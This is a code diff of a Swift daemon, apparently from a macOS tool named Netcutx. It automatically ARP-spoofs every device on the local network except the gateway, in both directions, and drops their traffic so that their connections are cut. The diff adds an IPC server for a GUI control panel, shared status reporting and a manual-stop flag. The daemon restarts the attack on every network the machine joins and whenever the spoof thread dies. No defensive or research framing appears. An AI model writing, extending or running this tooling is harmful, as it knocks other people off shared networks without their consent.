@@ -172,30 +172,32 @@ func daemonStatus() {
 func runDaemon() {
     writePid()
 
-    // Daemon-specific signal: SIGTERM → stop spoof + exit
+    // SIGTERM/SIGINT → stop both spoof loop and daemon loop
     var sa = sigaction()
     sigemptyset(&sa.sa_mask)
     sa.__sigaction_u.__sa_handler = { _ in
-        _stopFlag = 1
+        _stopFlag       = 1
+        _daemonExitFlag = 1
     }
     sa.sa_flags = 0
     sigaction(SIGTERM, &sa, nil)
-    sigaction(SIGINT, &sa, nil)
+    sigaction(SIGINT,  &sa, nil)
 
     daemonLog("Started (PID \(ProcessInfo.processInfo.processIdentifier))")
 
+    // Start IPC server for GUI communication
+    startIPCServer()
+
     var lastIface: String? = nil
     var lastIP: String?    = nil
-    var spoofThread: Thread?    = nil
-    var spoofActive             = false   // set false when spoof thread exits naturally
+    var spoofThread: Thread? = nil
+    var spoofActive          = false
 
-    // Signal spoof thread to stop and wait until it finishes restoring ARP tables
     func stopSpoofing(wait: Bool = true) {
         guard spoofThread != nil || spoofActive else { return }
         daemonLog("Stopping spoof...")
         requestSpooferStop()
         if wait {
-            // Poll until spoof thread marks itself inactive (max 3s)
             var waited = 0
             while spoofActive && waited < 30 {
                 Thread.sleep(forTimeInterval: 0.1)
@@ -204,6 +206,7 @@ func runDaemon() {
         }
         spoofThread = nil
         spoofActive = false
+        sharedState.update(active: false, targets: [], iface: nil, ip: nil)
     }
 
     func startSpoofing(ifname: String, ourIP: String, reason: String) {
@@ -214,8 +217,7 @@ func runDaemon() {
 
         let bpf: NetcutxBPF
         do { bpf = try NetcutxBPF(interface: ifname) } catch {
-            daemonLog("BPF open failed: \(error)")
-            return
+            daemonLog("BPF open failed: \(error)"); return
         }
 
         guard let ourMAC = getInterfaceMAC(ifname) else {
@@ -240,6 +242,7 @@ func runDaemon() {
         let targets = allDevices.filter { !$0.isGateway && !$0.isSelf && $0.ip != ourIP }
         if targets.isEmpty {
             daemonLog("No targets found — will retry on next cycle")
+            sharedState.update(active: false, targets: [], iface: ifname, ip: ourIP)
             return
         }
 
@@ -255,51 +258,58 @@ func runDaemon() {
                 victimMAC: mac,
                 gatewayMAC: gwMAC,
                 interval: 0.3,
-                bidirectional: true,   // poison both directions
-                forwardTraffic: false  // drop traffic — cut connection
+                bidirectional: true,
+                forwardTraffic: false
             ))
         }
 
         daemonLog("Spoofing \(configs.count) targets: \(configs.map(\.victimIP).joined(separator: ", "))")
+        sharedState.update(active: true, targets: configs.map(\.victimIP), iface: ifname, ip: ourIP)
 
         spoofActive = true
         let capturedConfigs = configs
         let t = Thread {
-            do {
-                try startMassSpoofing(configs: capturedConfigs)
-            } catch {
-                daemonLog("Spoof error: \(error)")
-            }
+            do { try startMassSpoofing(configs: capturedConfigs) }
+            catch { daemonLog("Spoof error: \(error)") }
             spoofActive = false
+            sharedState.update(active: false, targets: [], iface: ifname, ip: ourIP)
             daemonLog("Spoof thread exited")
         }
         t.start()
         spoofThread = t
     }
 
-    // Main monitor loop — poll every 2s for fast reconnect detection
-    while _stopFlag == 0 {
+    // Main monitor loop — poll every 2s
+    while _daemonExitFlag == 0 {
+        // Handle rescan request from GUI — also clears manual stop
+        if OSAtomicCompareAndSwap32(1, 0, &_rescanFlag), let iface = lastIface, let ip = lastIP {
+            daemonLog("Rescan requested by GUI")
+            OSAtomicAnd32(0, &_manualStopFlag)   // clear manual stop — user explicitly requested scan
+            startSpoofing(ifname: iface, ourIP: ip, reason: "rescan")
+        }
+
         let iface = getDefaultInterface()
         let ip    = iface.flatMap { getInterfaceIP($0) }
 
         if let iface = iface, let ip = ip {
             if iface != lastIface || ip != lastIP {
-                // New connect or IP/interface change (covers same-network reconnect
-                // because lastIP was set to nil on disconnect)
+                // New network or IP change — always start fresh, clear manual stop
                 lastIface = iface
                 lastIP    = ip
+                OSAtomicAnd32(0, &_manualStopFlag)
                 startSpoofing(ifname: iface, ourIP: ip, reason: "connect")
-            } else if !spoofActive {
-                // Still on same network but spoof thread died (BPF error, etc.) — restart
-                daemonLog("Spoof thread dead, restarting...")
+            } else if !spoofActive && _manualStopFlag == 0 {
+                // Spoof thread died by itself (BPF error etc) and user didn't manually stop — restart
+                daemonLog("Spoof thread died, restarting...")
                 startSpoofing(ifname: iface, ourIP: ip, reason: "restart")
             }
+            // If _manualStopFlag == 1: user stopped intentionally, stay idle
         } else {
             if lastIP != nil {
-                // Disconnected — stop spoof, reset state so reconnect always triggers fresh start
                 daemonLog("Network disconnected (\(lastIface ?? "?") \(lastIP ?? "?"))")
                 lastIface = nil
                 lastIP    = nil
+                OSAtomicAnd32(0, &_manualStopFlag)  // reset — next connect starts fresh
                 stopSpoofing()
             }
         }
